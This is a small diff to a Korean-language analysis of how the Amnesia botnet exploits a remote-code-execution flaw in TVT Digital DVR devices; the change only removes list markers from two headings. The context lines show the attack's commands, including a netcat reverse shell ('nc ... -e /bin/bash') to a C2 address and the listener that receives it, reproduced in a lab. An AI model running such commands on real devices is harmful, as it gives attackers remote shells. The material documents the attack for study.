@@ -514,7 +514,7 @@ TVT Digital에서 제작한 DVR Device는 HTTP Response Header 내 "Cross Web Se
 
 취약한 DVR Device가 발견되면 Amnesia botnet은 RCE 취약점을 이용해 4가지 명령어를 HTTP Request로 보내게 된다.
 
-- DVR Device 측
+DVR Device 측
 
 ```
 echo "nc" > f
@@ -527,7 +527,7 @@ study persu$ ps
 13370 ttys000    0:00.01 nc 192.168.1.1 8888 -e /bin/bash
 ```
 
-- C2 서버 측 (가상환경)
+C2 서버 측 (가상환경)
 
 ```
 study persu$ nc -l -p 8888
